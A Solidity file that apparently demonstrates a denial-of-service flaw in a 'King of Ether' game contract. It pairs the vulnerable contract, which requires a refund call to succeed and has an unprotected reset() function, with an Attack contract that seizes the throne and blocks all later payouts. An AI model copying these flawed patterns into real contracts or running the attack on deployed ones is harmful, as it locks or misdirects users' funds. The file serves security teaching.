// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract KingOfEther {
    address public king;
    uint public balance;

    function deposit() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }

    function reset() external {
        require(balance > 0, "No game to reset");
        king = address(0);
        balance = 0;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.deposit{value: msg.value}();
    }
}
